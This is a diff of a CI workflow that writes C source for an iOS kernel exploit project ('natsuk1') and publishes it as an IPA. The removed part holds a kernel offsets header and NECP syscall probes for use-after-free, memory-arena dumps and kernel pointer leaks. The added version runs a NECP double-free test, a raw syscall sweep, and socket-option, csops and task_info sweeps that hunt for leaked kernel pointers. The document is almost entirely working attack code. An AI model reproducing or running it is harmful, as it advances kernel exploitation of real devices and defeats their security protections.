@@ -31,74 +31,6 @@ jobs:
           rm -f .github/workflows/fix_and_test.yml
           rm -f natsuk1/Views/SimpleList.swift
 
-      - name: Write nk_offsets.h
-        run: |
-          cat > natsuk1/Exploit/nk_offsets.h <<'NK_EOF'
-          #ifndef NK_OFFSETS_H
-          #define NK_OFFSETS_H
-          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
-          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
-          #define NK_SYSENT_COUNT               558
-          #define NK_SLIDE_FALLBACK             0x3D00000ULL
-          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
-          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
-          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
-          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
-          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
-          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
-          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
-          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
-          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
-          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
-          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
-          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
-          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL
-          #define NK_NECP_OP_ADD_CLIENT         0x01
-          #define NK_NECP_OP_REMOVE_CLIENT      0x02
-          #define NK_NECP_OP_COPY_RESULT        0x03
-          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
-          #define NK_NECP_OP_COPY_LIST          0x05
-          #define NK_NECP_OP_REQUEST_NEXUS      0x06
-          #define NK_NECP_OP_AGENT_ACTION       0x07
-          #define NK_NECP_OP_COPY_AGENT         0x08
-          #define NK_NECP_OP_COPY_INTERFACE     0x09
-          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
-          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
-          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
-          #define NK_NECP_OP_UPDATE_CACHE       0x0E
-          #define NK_NECP_OP_COPY_UPDATE        0x0F
-          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
-          #define NK_NECP_OP_ADD_FLOW           0x11
-          #define NK_NECP_OP_REMOVE_FLOW        0x12
-          #define NK_NECP_OP_CLAIM              0x13
-          #define NK_NECP_OP_SIGN               0x14
-          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
-          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
-          #define NK_NECP_OP_VALIDATE           0x17
-          #define NK_NECP_OP_GET_SIGNED_ID      0x18
-          #define NK_NECP_OP_SET_SIGNED_ID      0x19
-          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
-          #define NK_NECP_OP_GET_FLOW_STATS     0x1B
-          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
-          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
-          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
-          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL
-          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL
-          #define NK_ARENA_SIZE                 0x4000ULL
-          #define NK_FLOW_OFF_NEXT              0x30
-          #define NK_FLOW_OFF_LEN               0x68
-          #define NK_FLOW_OFF_INLINE            0x70
-          #define NK_FLOW_OFF_LIST_NEXT         0x38
-          #define NK_FLOW_OFF_LIST_PREV         0x40
-          #define NK_FLOW_OFF_FLAGS             0x74
-          #define NK_FLOW_OFF_PARENT            0x88
-          #define NK_FLOW_OFF_RULES             0x90
-          #define NK_FLOW_OFF_IFACE_COUNT       0x538
-          #define NK_FLOW_OFF_PARAMS_LEN        0x5a0
-          #define NK_FLOW_OFF_PARAMS_PTR        0x5a8
-          #endif
-          NK_EOF
-
       - name: Write necp.c
         run: |
           cat > natsuk1/Exploit/necp.c <<'NECP_EOF'
@@ -110,7 +42,13 @@ jobs:
           #include <stdarg.h>
           #include <unistd.h>
           #include <errno.h>
+          #include <fcntl.h>
           #include <sys/syscall.h>
+          #include <sys/sysctl.h>
+          #include <sys/socket.h>
+          #include <sys/utsname.h>
+          #include <netinet/in.h>
+          #include <netinet/tcp.h>
           #include <mach/mach.h>
           #include <mach/message.h>
           #include <mach/vm_region.h>
@@ -148,27 +86,13 @@ jobs:
               uint8_t p[1] = {0};
               return (int)syscall(SYS_NECP_ACTION, fd, 0x01, uuid, (size_t)16, p, (size_t)1);
           }
-          static int nadd_flow_ex(int fd, const uint8_t cu[16], uint8_t fu[16], uint16_t flag, size_t sz) {
-              static uint8_t req[512];
-              memset(req, 0, sizeof(req));
-              memcpy(req + 0x10, cu, 16);
-              *(uint16_t*)(req + 0x20) = flag;
-              if (sz < 0x24) sz = 0x24;
-              if (sz > sizeof(req)) sz = sizeof(req);
-              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11,
-                                   (void*)cu, (size_t)16, req, sz);
-              if (r == 0 && fu) {
-                  memcpy(fu, req, 16);
-                  fu[9] |= 0x01;
-              }
-              return r;
-          }
           static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
-              return nadd_flow_ex(fd, cu, fu, 0x0040, 56);
-          }
-          static int nrm_flow(int fd, const uint8_t fu[16]) {
-              return (int)syscall(SYS_NECP_ACTION, fd, 0x12,
-                                  (void*)fu, (size_t)16, NULL, (size_t)0);
+              uint8_t req[56]; memset(req, 0, sizeof(req));
+              memcpy(req + 0x10, cu, 16);
+              *(uint16_t*)(req + 0x20) = 0x0040;
+              int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11, (void*)cu, (size_t)16, req, (size_t)56);
+              if (r == 0) { memcpy(fu, req, 16); fu[9] |= 0x01; }
+              return r;
           }
           static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
               if (len > max) len = max;
@@ -192,258 +116,260 @@ jobs:
               }
               return found;
           }
-          static int step_arena_full(void) {
+          /* ---------- STEP A: system info ---------- */
+          static int step_sysinfo(void) {
               nk_log("");
-              LI("S1", "arena 16KB dump + kptr scan");
-              int fd = nfd();
-              if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              uint64_t uva = 0;
-              int rc = (int)syscall(SYS_NECP_ACTION, fd, 0x0D, (void*)0, (size_t)0, (void*)&uva, (size_t)8);
-              LI("S1", "uva=0x%llx", (unsigned long long)uva);
-              close(fd);
-              if (rc != 0) { LE("S1", "leak rc=%d", rc); return -1; }
-              static uint8_t big[16384]; memset(big, 0, sizeof(big));
-              mach_vm_size_t got = 0;
-              kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), uva, sizeof(big),
-                                                        (mach_vm_address_t)(uintptr_t)big, &got);
-              LI("S1", "read kr=%d got=%llu", kr, (unsigned long long)got);
-              if (kr == KERN_SUCCESS && got > 0) {
-                  LI("S1", "first 256:");
-                  hexdump("S1H", big, 256, 256);
-                  LI("S1", "last 256:");
-                  if (got > 256) hexdump("S1L", big + got - 256, 256, 256);
-                  int nk = scan_kptr("S1K", big, (int)got, 32);
-                  LI("S1", "kptr total = %d", nk);
-                  int lastnz = 0;
-                  for (int i = 0; i < (int)got; i++) if (big[i] != 0) lastnz = i;
-                  LI("S1", "last nonzero off: 0x%x", lastnz);
+              LI("A1", "uname + sysctl kern.*");
+              struct utsname u;
+              if (uname(&u) == 0) {
+                  LI("A1", "sysname=%s", u.sysname);
+                  LI("A1", "release=%s", u.release);
+                  LI("A1", "version=%s", u.version);
+                  LI("A1", "machine=%s", u.machine);
               }
-              return 0;
-          }
-          static int step_all_opcodes(void) {
-              nk_log("");
-              LI("S2", "enumerate opcodes 0x01..0x1B with fresh client each");
-              for (uint32_t op = 0x01; op <= 0x1B; op++) {
-                  int fd = nfd();
-                  if (fd < 0) continue;
-                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-                  nadd_client(fd, cu);
-                  nadd_flow(fd, cu, fu);
-
-                  uint8_t buf[512]; memset(buf, 0, sizeof(buf));
-                  int c = (int)syscall(SYS_NECP_ACTION, fd, op,
-                                       (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-                  LI("S2", "op=0x%02x ret=%d", op, c);
-                  if (c > 0) {
-                      hexdump("S2H", buf, c, 64);
+              const char *keys[] = {
+                  "kern.osproductversion", "kern.osversion", "kern.osrevision",
+                  "kern.version", "kern.uuid", "kern.boottime", "kern.hostname",
+                  "kern.ostype", "kern.osrelease", "kern.argmax", "kern.secure_kernel",
+                  "kern.tfp.policy", "kern.exclaves_status",
+                  "hw.machine", "hw.model", "hw.memsize", "hw.ncpu", "hw.cpufamily",
+                  "hw.cputype", "hw.cpusubtype", "hw.targettype", "hw.model"
+              };
+              for (size_t i = 0; i < sizeof(keys)/sizeof(keys[0]); i++) {
+                  char val[256]; size_t sz = sizeof(val);
+                  memset(val, 0, sizeof(val));
+                  if (sysctlbyname(keys[i], val, &sz, NULL, 0) == 0) {
+                      LI("A2", "%s = %s", keys[i], val);
                   }
-                  close(fd);
+              }
+              uint64_t boot = 0; size_t bs = sizeof(boot);
+              if (sysctlbyname("kern.boottime", &boot, &bs, NULL, 0) == 0) {
+                  LI("A3", "kern.boottime = 0x%llx", (unsigned long long)boot);
               }
               return 0;
           }
-          static int step_add_flow_flags(void) {
+          /* ---------- STEP B: NECP recap ---------- */
+          static int step_necp_recap(void) {
               nk_log("");
-              LI("S3", "add_flow with various flags");
-              uint16_t flags[] = {0x0001, 0x0002, 0x0004, 0x0008, 0x0010, 0x0020, 0x0040,
-                                  0x0080, 0x0100, 0x0200, 0x0400, 0x0800, 0x1000, 0x2000,
-                                  0x4000, 0x8000, 0xFFFF};
-              for (size_t i = 0; i < sizeof(flags)/sizeof(flags[0]); i++) {
-                  int fd = nfd();
-                  if (fd < 0) continue;
-                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-                  nadd_client(fd, cu);
-                  int r = nadd_flow_ex(fd, cu, fu, flags[i], 56);
-                  LI("S3", "flag=0x%04x add_flow ret=%d", flags[i], r);
+              LI("B1", "NECP recap: op 0x03/0x04/0x10/0x1A");
+              int fd = nfd();
+              if (fd < 0) { LE("B1", "open errno=%d", errno); return -1; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              nadd_client(fd, cu);
+              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
+              nadd_flow(fd, cu, fu);
+
+              uint32_t ops[] = {0x03, 0x04, 0x10, 0x1A};
+              for (size_t i = 0; i < 4; i++) {
+                  uint8_t buf[2048]; memset(buf, 0, sizeof(buf));
+                  int c = (int)syscall(SYS_NECP_ACTION, fd, ops[i],
+                                       (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
+                  LI("B1", "op=0x%02x ret=%d", ops[i], c);
+                  if (c > 0) {
+                      hexdump("B1H", buf, c, 512);
+                      scan_kptr("B1K", buf, c, 8);
+                  }
+              }
+              LI("B2", "double-free test");
+              int r1 = (int)syscall(SYS_NECP_ACTION, fd, 0x12, (void*)fu, (size_t)16, NULL, (size_t)0);
+              int r2 = (int)syscall(SYS_NECP_ACTION, fd, 0x12, (void*)fu, (size_t)16, NULL, (size_t)0);
+              LI("B2", "remove#1=%d remove#2=%d", r1, r2);
+              close(fd);
+              return 0;
+          }
+          /* ---------- STEP C: syscall sweep ---------- */
+          static int is_dangerous(int n) {
+              return n == 0 || n == 1 || n == 2 || n == 7 || n == 59 || n == 198;
+          }
+          static int step_syscall_sweep(void) {
+              nk_log("");
+              LI("C1", "syscall sweep 0..558 with zero args");
+              int enosys = 0, eperm = 0, einval = 0, other = 0;
+              for (int n = 0; n <= 558; n++) {
+                  if (is_dangerous(n)) { LI("C1", "syscall %d SKIP", n); continue; }
+                  errno = 0;
+                  long r = syscall(n, 0, 0, 0, 0, 0, 0, 0, 0);
+                  int e = errno;
+                  if (r == -1 && e == 78) {
+                      enosys++;
+                  } else if (r == -1 && e == 1) {
+                      eperm++;
+                  } else if (r == -1 && e == 22) {
+                      einval++;
+                  } else {
+                      other++;
+                      LI("C1", "syscall %d -> r=%ld errno=%d", n, r, e);
+                  }
+              }
+              LI("C2", "summary: ENOSYS=%d EPERM=%d EINVAL=%d OTHER=%d",
+                 enosys, eperm, einval, other);
+              return 0;
+          }
+          /* ---------- STEP D: targeted leaks ---------- */
+          static int step_getsockopt(void) {
+              nk_log("");
+              LI("D1", "getsockopt leak attempts");
+              int s = socket(AF_INET, SOCK_STREAM, 0);
+              if (s < 0) { LE("D1", "socket errno=%d", errno); return -1; }
+              int opts[] = {TCP_NODELAY, TCP_MAXSEG, TCP_KEEPALIVE, TCP_KEEPINTVL, TCP_KEEPCNT,
+                            TCP_CONNECTIONTIMEOUT, TCP_RXT_CONNDROPTIME, TCP_RXT_FINDROP,
+                            TCP_KEEPINIT, TCP_FASTOPEN, TCP_NOOPT, TCP_NOPUSH,
+                            TCP_NOTSENT_LOWAT, TCP_ADAPTIVE_READ_TIMEOUT, TCP_ADAPTIVE_WRITE_TIMEOUT,
+                            TCP_ENABLE_ECN, TCP_ECN_MODE, TCP_LEDBAT_MODE, TCP_MEASURE_SND_BTL,
+                            TCP_MEASURE_BW_BURST, TCP_ABORT_ON_OVERFLOW, TCP_ACK_PRIORITY,
+                            TCP_OVERWRITE_MSS, TCP_RECV_ANYIF, TCP_RECOMPUTE_SND_CWND,
+                            TCP_USE_ECN, TCP_DISABLE_BLACKHOLE_DETECTION, TCP_TIMESTAMP,
+                            TCP_FASTOPEN_KEY};
+              for (size_t i = 0; i < sizeof(opts)/sizeof(opts[0]); i++) {
+                  uint8_t buf[64]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
+                  int r = getsockopt(s, IPPROTO_TCP, opts[i], buf, &bl);
                   if (r == 0) {
-                      uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
-                      int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                           (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-                      LI("S3", "  copy_result=%d", c);
-                      if (c > 0) {
-                          int nk = scan_kptr("S3K", buf, c, 4);
-                          LI("S3", "  kptr=%d", nk);
+                      LI("D1", "TCP opt %d bl=%u", opts[i], (unsigned)bl);
+                      if (bl > 4) hexdump("D1H", buf, bl, 64);
+                  }
+              }
+              /* socket-level */
+              int slev[] = {SO_DEBUG, SO_REUSEADDR, SO_REUSEPORT, SO_KEEPALIVE, SO_DONTROUTE,
+                            SO_BROADCAST, SO_USELOOPBACK, SO_LINGER, SO_OOBINLINE, SO_REUSEPORT_LF,
+                            SO_NOSIGPIPE, SO_NO_CHECK, SO_PRIORITY, SO_LINGER_SEC, SO_RESTRICTIONS,
+                            SO_RESTRICT_DENYIN, SO_RESTRICT_DENYOUT, SO_RESTRICT_DENYSET,
+                            SO_LINGER, SO_NOWAKEFROMSLEEP, SO_OPPORTUNISTIC,
+                            SO_SNDBUF, SO_RCVBUF, SO_SNDLOWAT, SO_RCVLOWAT,
+                            SO_ERROR, SO_TYPE, SO_NREAD, SO_NWRITE, SO_LINGER,
+                            SO_RCVTIMEO, SO_SNDTIMEO, SO_ACCEPTCONN, SO_PEERNAME,
+                            SO_FLUSH, SO_RECV_ANYIF, SO_TRAFFIC_CLASS, SO_RECV_TRAFFIC_CLASS,
+                            SO_TRAFFIC_MGT_BACKGROUND, SO_FILTER, SO_TCPSACK, SO_BINDTODEVICE,
+                            SO_EXTENDED_BK_IDLE, SO_TCPSACK};
+              for (size_t i = 0; i < sizeof(slev)/sizeof(slev[0]); i++) {
+                  uint8_t buf[128]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
+                  int r = getsockopt(s, SOL_SOCKET, slev[i], buf, &bl);
+                  if (r == 0 && bl > 4) {
+                      LI("D2", "SOL opt %d bl=%u", slev[i], (unsigned)bl);
+                      hexdump("D2H", buf, bl, 128);
+                  }
+              }
+              close(s);
+              return 0;
+          }
+          static int step_proc_info(void) {
+              nk_log("");
+              LI("D3", "proc_info flavors");
+              /* proc_info requires csops-like access; try flavor sweep via syscall 336 */
+              for (int flavor = 1; flavor <= 20; flavor++) {
+                  uint8_t buf[256]; memset(buf, 0, sizeof(buf));
+                  int sz = 0;
+                  long r = syscall(336, getpid(), flavor, buf, sizeof(buf), &sz);
+                  if (r == 0 && sz > 0) {
+                      LI("D3", "flavor=%d sz=%d", flavor, sz);
+                      hexdump("D3H", buf, sz < 256 ? sz : 256, 256);
+                  }
+              }
+              return 0;
+          }
+          static int step_csops(void) {
+              nk_log("");
+              LI("D4", "csops flavors");
+              for (int op = 0; op <= 15; op++) {
+                  uint8_t buf[256]; memset(buf, 0, sizeof(buf));
+                  size_t sz = sizeof(buf);
+                  long r = syscall(169, getpid(), op, buf, sz);
+                  if (r == 0) {
+                      LI("D4", "csops op=%d -> ok", op);
+                      hexdump("D4H", buf, 256, 256);
+                  }
+              }
+              return 0;
+          }
+          static int step_mach_traps(void) {
+              nk_log("");
+              LI("D5", "mach traps via task_info + thread_info sweep");
+              mach_port_t task = mach_task_self();
+              for (int flavor = 1; flavor <= 40; flavor++) {
+                  natural_t count = 0;
+                  kern_return_t kr = task_info(task, flavor, NULL, &count);
+                  if (kr == KERN_SUCCESS && count > 0) {
+                      uint8_t *buf = malloc(count * sizeof(natural_t));
+                      if (buf) {
+                          memset(buf, 0, count * sizeof(natural_t));
+                          kr = task_info(task, flavor, (task_info_t)buf, &count);
+                          if (kr == KERN_SUCCESS) {
+                              LI("D5", "task_info flavor=%d count=%d", flavor, count);
+                              hexdump("D5H", buf, count * (int)sizeof(natural_t), 256);
+                              scan_kptr("D5K", buf, count * (int)sizeof(natural_t), 8);
+                          }
+                          free(buf);
                       }
                   }
-                  close(fd);
               }
               return 0;
           }
-          static int step_add_flow_sizes(void) {
+          static int step_socket_getsockopt_more(void) {
               nk_log("");
-              LI("S4", "add_flow size sweep");
-              size_t sizes[] = {0x24, 0x30, 0x3c, 0x3d, 0x40, 0x60, 0x80, 0xc0, 0xe0, 0xf0, 0xf1, 0xf2};
-              for (size_t i = 0; i < sizeof(sizes)/sizeof(sizes[0]); i++) {
-                  int fd = nfd();
-                  if (fd < 0) continue;
-                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-                  nadd_client(fd, cu);
-                  int r = nadd_flow_ex(fd, cu, fu, 0x0040, sizes[i]);
-                  LI("S4", "size=0x%zx add_flow ret=%d", sizes[i], r);
-                  if (r == 0) {
-                      uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
-                      int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                           (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-                      LI("S4", "  copy_result=%d", c);
+              LI("D6", "IPPROTO_IP + IPPROTO_IPV6 opts");
+              int s = socket(AF_INET, SOCK_DGRAM, 0);
+              if (s >= 0) {
+                  for (int opt = 0; opt <= 200; opt++) {
+                      uint8_t buf[64]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
+                      int r = getsockopt(s, IPPROTO_IP, opt, buf, &bl);
+                      if (r == 0 && bl > 4) {
+                          LI("D6", "IP opt %d bl=%u", opt, (unsigned)bl);
+                          hexdump("D6H", buf, bl, 64);
+                          scan_kptr("D6K", buf, bl, 4);
+                      }
                   }
-                  close(fd);
+                  close(s);
               }
-              return 0;
-          }
-          static int step_claim(void) {
-              nk_log("");
-              LI("S5", "op=0x13 claim - rebind client");
-              int fdA = nfd();
-              int fdB = nfd();
-              if (fdA < 0 || fdB < 0) return -1;
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              nadd_client(fdA, cu);
-              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-              nadd_flow(fdA, cu, fu);
-
-              uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
-              int c1 = (int)syscall(SYS_NECP_ACTION, fdA, 0x03,
-                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S5", "copy_result from A (before claim): %d", c1);
-
-              int rc = (int)syscall(SYS_NECP_ACTION, fdB, 0x13,
-                                    (void*)cu, (size_t)16, NULL, (size_t)0);
-              LI("S5", "claim rc=%d", rc);
-
-              memset(buf, 0, sizeof(buf));
-              int c2 = (int)syscall(SYS_NECP_ACTION, fdB, 0x03,
-                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S5", "copy_result from B (after claim): %d", c2);
-              if (c2 > 0) hexdump("S5H", buf, c2, 512);
-
-              memset(buf, 0, sizeof(buf));
-              int c3 = (int)syscall(SYS_NECP_ACTION, fdA, 0x03,
-                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S5", "copy_result from A (after claim): %d", c3);
-
-              close(fdA);
-              close(fdB);
-              return 0;
-          }
-          static int step_uaf(void) {
-              nk_log("");
-              LI("S6", "UAF probe: remove_flow + copy_result");
-              int fd = nfd();
-              if (fd < 0) return -1;
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              nadd_client(fd, cu);
-              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-              int rf = nadd_flow(fd, cu, fu);
-              LI("S6", "add_flow=%d", rf);
-              int r1 = nrm_flow(fd, fu);
-              LI("S6", "remove#1=%d", r1);
-
-              uint8_t buf[2048]; memset(buf, 0, sizeof(buf));
-              int c1 = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S6", "copy_result after free=%d", c1);
-              if (c1 > 0) {
-                  hexdump("S6H", buf, c1, 512);
-                  int nk = scan_kptr("S6K", buf, c1, 8);
-                  LI("S6", "  kptr=%d", nk);
-              }
-
-              int r2 = nrm_flow(fd, fu);
-              LI("S6", "remove#2=%d", r2);
-
-              int rf2 = nadd_flow(fd, cu, fu);
-              LI("S6", "re-add=%d", rf2);
-              memset(buf, 0, sizeof(buf));
-              int c2 = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                    (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S6", "copy_result re-add=%d", c2);
-              if (c2 > 0) {
-                  hexdump("S6R", buf, c2, 512);
-                  int nk = scan_kptr("S6RK", buf, c2, 8);
-                  LI("S6", "  kptr=%d", nk);
-              }
-
-              close(fd);
-              return 0;
-          }
-          static int step_multi_flow(void) {
-              nk_log("");
-              LI("S7", "5 flows on one client");
-              int fd = nfd();
-              if (fd < 0) return -1;
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              nadd_client(fd, cu);
-              for (int i = 0; i < 5; i++) {
-                  uint8_t fu[16]; memset(fu, 0, sizeof(fu));
-                  int r = nadd_flow(fd, cu, fu);
-                  LI("S7", "flow#%d ret=%d", i, r);
-              }
-              uint8_t buf[8192]; memset(buf, 0, sizeof(buf));
-              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                   (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S7", "copy_result=%d", c);
-              if (c > 0) {
-                  hexdump("S7H", buf, c, 1024);
-                  int nk = scan_kptr("S7K", buf, c, 16);
-                  LI("S7", "kptr=%d", nk);
-              }
-              close(fd);
-              return 0;
-          }
-          static int step_tlv_types(void) {
-              nk_log("");
-              LI("S8", "TLV types in add_flow");
-              uint8_t types[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
-                                 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0xda, 0xd4, 0xdb, 0xdc};
-              for (size_t i = 0; i < sizeof(types); i++) {
-                  int fd = nfd();
-                  if (fd < 0) continue;
-                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-                  nadd_client(fd, cu);
-
-                  uint8_t req[80]; memset(req, 0, sizeof(req));
-                  memcpy(req + 0x10, cu, 16);
-                  *(uint16_t*)(req + 0x20) = 0x0040;
-                  req[0x24] = types[i];
-                  *(uint32_t*)(req + 0x25) = 0x08;
-                  uint8_t fu[16];
-                  int r = (int)syscall(SYS_NECP_ACTION, fd, 0x11,
-                                       (void*)cu, (size_t)16, req, (size_t)80);
-                  LI("S8", "type=0x%02x add_flow ret=%d", types[i], r);
-                  if (r == 0) {
-                      uint8_t buf[1024]; memset(buf, 0, sizeof(buf));
-                      int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                           (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-                      LI("S8", "  copy_result=%d", c);
+              int s6 = socket(AF_INET6, SOCK_DGRAM, 0);
+              if (s6 >= 0) {
+                  for (int opt = 0; opt <= 100; opt++) {
+                      uint8_t buf[64]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
+                      int r = getsockopt(s6, IPPROTO_IPV6, opt, buf, &bl);
+                      if (r == 0 && bl > 4) {
+                          LI("D7", "IPV6 opt %d bl=%u", opt, (unsigned)bl);
+                          hexdump("D7H", buf, bl, 64);
+                      }
                   }
-                  close(fd);
+                  close(s6);
+              }
+              return 0;
+          }
+          static int step_setsockopt_icmp(void) {
+              nk_log("");
+              LI("D8", "setsockopt leak via ICMP");
+              int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
+              if (s >= 0) {
+                  for (int opt = 0; opt <= 100; opt++) {
+                      uint32_t v = 0xdeadbeef;
+                      int r = setsockopt(s, IPPROTO_ICMP, opt, &v, sizeof(v));
+                      if (r == 0) {
+                          uint8_t buf[128]; socklen_t bl = sizeof(buf); memset(buf, 0, sizeof(buf));
+                          if (getsockopt(s, IPPROTO_ICMP, opt, buf, &bl) == 0 && bl > 4) {
+                              LI("D8", "ICMP opt %d bl=%u", opt, (unsigned)bl);
+                              hexdump("D8H", buf, bl, 128);
+                          }
+                      }
+                  }
+                  close(s);
               }
               return 0;
           }
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v6.0 - NECP EXHAUSTIVE RECON");
+              nk_log("natsuk1 v7.0 - FINAL RECON (NECP + syscall fuzz)");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
-              int fd = nfd();
-              if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
-              close(fd);
-              LO("PRE", "necp_open OK");
 
-              step_arena_full();
-              step_all_opcodes();
-              step_add_flow_flags();
-              step_add_flow_sizes();
-              step_claim();
-              step_uaf();
-              step_multi_flow();
-              step_tlv_types();
+              step_sysinfo();
+              step_necp_recap();
+              step_syscall_sweep();
+              step_getsockopt();
+              step_socket_getsockopt_more();
+              step_setsockopt_icmp();
+              step_proc_info();
+              step_csops();
+              step_mach_traps();
 
               nk_log("");
               nk_log("======== done ========");
@@ -498,7 +424,7 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v6.0 exhaustive NECP recon
+          NOTES="natsuk1 v7.0 final recon
 
           IPA: ${IPA_URL}
 
